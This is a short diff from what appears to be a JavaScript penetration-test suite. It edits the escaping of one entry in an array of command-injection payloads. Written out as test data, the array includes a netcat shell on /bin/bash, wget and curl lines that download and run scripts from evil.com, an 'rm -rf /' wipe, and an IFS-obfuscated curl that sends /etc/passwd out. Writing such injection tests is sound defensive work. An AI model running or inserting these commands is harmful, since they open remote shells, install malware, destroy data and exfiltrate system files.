@@ -913,7 +913,7 @@ describe('Penetration Tests', () => {
         '| nc -lvp 4444 -e /bin/bash',
         '&& wget http://evil.com/malware.sh -O /tmp/malware.sh && chmod +x /tmp/malware.sh && /tmp/malware.sh',
         '`curl -s http://evil.com/steal.sh | bash`',
-        '$(python -c "import os; os.system(\\'rm -rf /\\')")',
+        '$(python -c "import os; os.system(\'rm -rf /\')")',
         '${IFS}curl${IFS}evil.com/exfiltrate${IFS}-d${IFS}@/etc/passwd'
       ];
 
